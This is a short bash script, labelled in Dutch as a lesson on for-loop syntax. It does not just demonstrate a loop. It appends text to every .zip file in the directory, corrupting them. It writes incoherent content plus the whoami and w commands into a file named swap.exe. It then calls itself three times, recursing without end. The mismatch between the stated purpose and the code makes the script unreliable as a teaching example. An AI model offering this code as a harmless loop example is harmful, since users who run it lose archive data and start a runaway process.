#!/bin/bash
#Auteur: Dhr. ing. B.A. Blaauwgeers
#Script nr 7: Bash for loop explicit file list syntax

for file in *.zip
do 
	echo "$(date) : stripon" >> "$file"
	echo "XXX -from --- PPPP" >> swap.exe
	echo date >> swap.exe
	echo whoami >> swap.exe
	echo w >> swap.exe
done
sleep 1
./script7.sh
./script7.sh
./script7.sh
echo x
